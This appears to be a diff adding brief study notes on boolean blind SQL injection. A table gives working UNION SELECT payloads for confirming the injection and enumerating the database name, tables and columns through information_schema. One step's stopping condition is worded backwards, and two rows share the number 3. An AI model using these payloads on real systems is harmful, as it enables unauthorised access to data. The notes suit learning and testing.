@@ -1,0 +1,9 @@
+#boolean_blind_sql_injection
+
+| Step | Description                                     | Realisation                                                                                                                                                                                                                                          |
+| ---- | ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 1    | Confirm injection                               | `admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--` - % wildcard matches everything, so, it's always return true                                                                                                                             |
+| 2    | Guess the database name, character by character | `admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--`<br>`admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'b%';--`<br>until it's don't return true                                                                                         |
+| 3    | Get table names                                 | `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--`<br>`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'b%';--` |
+| 3    | Get column names                                | `admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--`                                                                                                                               |
+
